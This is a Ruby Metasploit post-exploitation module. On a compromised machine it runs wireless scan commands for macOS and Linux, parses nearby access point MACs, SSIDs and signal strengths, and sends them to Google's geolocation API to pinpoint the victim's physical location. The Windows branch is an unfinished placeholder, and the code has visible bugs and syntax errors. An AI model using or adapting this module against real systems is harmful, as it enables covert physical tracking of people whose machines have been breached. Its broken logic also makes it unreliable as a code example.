require 'msf/core'
require 'rex/proto/http/client'

class Metasploit3 < Msf::Post
	
	include Msf::Auxiliary::Badger_Report
	#include Msf::Post::Common

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'WLAN Geolocation Using Google API',
			'Description'   => %q{
				This module does some neat shit. Thanks to Tim.
			},
			'License'       => MSF_LICENSE,
			'Author'        => ['v10l3nt'],
			'Version'       => '$Revision$',
			'Platform'      => [ 'windows', 'linux', 'osx'],
			'SessionTypes'  => [ 'meterpreter', 'shell' ]
		))
	end

	def wlan_survey()
		survey = ""
		print_status("Surveying Wireless Networks")
		case session.platform
		when /osx/
			wdata= session.shell_command("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s")
			print_status(wdata)
			wdata.each do |line|
			if (line =~ /((?:[0-9a-f]{2}[:-]){5}[0-9a-f]{2})/i)
				mac = $1
				idx=line.index(mac)-1
				ssid=line[0..idx].gsub!(/\s+/, "")
				rssi=line[idx+19..idx+22].gsub!(/\s+/, "") ## cleanup --> ugly
				survey << "&wifi=mac:#{mac}%7Cssid:#{ssid}%7Css:#{rssi}"
			end
		end

		when /win/

#### Need to do windows wlan for windows 7 | vista | 2008
		print_status("WIN: cmd.exe /c netsh wlan show networks mode=bssid | findstr \"SSID Signal\"")
		cmd = "ipconfig"
		if session.type =~ /shell/
			print_status("shell")
			wdata << session.shell_command(cmd.chomp)
		elsif session.type =~ /meterpreter/
			winver = session.sys.config.sysinfo["OS"]
			print_status(winver)
			print_status("meterpreter")
			wdata=cmd_exec(cmd)
		end
		print_status("wdata=#{wdata}")

		when /linux/
			if session.type =~ /shell/
				wdata= session.shell_command("/sbin/iwlist wlan0 scan | egrep 'Address|ESSID|Signal'")
			elsif session.type =~ /meterpreter/
				wdata=cmd_exec(cmd)
			end
			print_status("#{wdata}")
			mac,rssi,ssid=nil
			wdata.each do |line|
				if (line =~ /((?:[0-9a-f]{2}[:-]){5}[0-9a-f]{2})/i)
					mac = $1
				elsif (line =~ /(-[0-9]* dBm)/i)
					rssi = $1.chomp(" dBm")
				elsif (line.include? 'ESSID'):
					ssid=line.gsub!("ESSID:", "").gsub!("\"","").gsub!(/\s+/, "")
				end
				if (mac and rssi and ssid)
					survey << "&wifi=mac:#{mac}%7Cssid:#{ssid}%7Css:#{rssi}"
					mac,rssi,ssid=nil
				end
		end
		
		else
			print_error "Unsupported platform #{session.platform}"
			return
		end
		return survey
end

	def wlan_triangulate(survey)
		c = Rex::Proto::Http::Client.new("maps.googleapis.com",443,{},true)
		uri = "/maps/api/browserlocation/json?browser=firefox&sensor=true#{survey}"
		r = c.request_raw('uri'=>uri)
		resp=c.send_recv(r)
		res=resp.body

		if res =~ /(accuracy(.)+.,)/
			acc = $1.sub("accuracy\" :","").chomp(",").gsub!(/\s+/, "")
		end
		if res =~ /(lat(.)+.,)/
			lat = $1.sub("lat\" :","").chomp(",").gsub!(/\s+/, "")
		end

		if res =~ /(lng(.)+.)/
			lon = $1.sub("lng\" :","").gsub!(/\s+/, "")
		end
		pos = Position.new(lat,lon,acc)
		print_status("Google Triangulated Position:  lat: #{pos.lat}, lon: #{pos.lon}, acc: #{pos.acc}")
		return pos
	end

	def run

		survey = wlan_survey()
		pos = wlan_triangulate(survey)
		report_results(pos,"msf_wlansurvey")
	end

end
